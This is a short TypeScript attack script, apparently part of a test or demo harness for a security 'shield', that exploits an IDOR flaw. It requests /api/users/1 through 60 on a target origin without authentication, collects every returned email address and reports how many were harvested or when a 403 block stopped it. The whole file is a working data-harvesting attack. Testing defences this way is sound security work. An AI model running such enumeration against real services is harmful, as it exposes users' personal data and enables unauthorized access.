// IDOR: walk /api/users/1..N with no auth and collect every email.
import { attackFetch, banner, requireVerifiedTarget } from "./_lib.ts";

const origin = requireVerifiedTarget();
banner("idor-enumerate", origin);

const N = 60;
const emails: string[] = [];
let blockedAt = 0;

for (let id = 1; id <= N; id++) {
  const res = await attackFetch(`${origin}/api/users/${id}`);
  if (res.status === 403) {
    blockedAt = id;
    break;
  }
  if (res.ok) {
    const u = await res.json();
    if (u?.email) emails.push(u.email);
  }
}

if (blockedAt) {
  console.log(`Blocked after ${blockedAt} requests (shield). Pulled ${emails.length} emails before the block.`);
} else {
  console.log(`Pulled ${emails.length} user emails with no auth. e.g. ${emails.slice(0, 3).join(", ")}`);
}
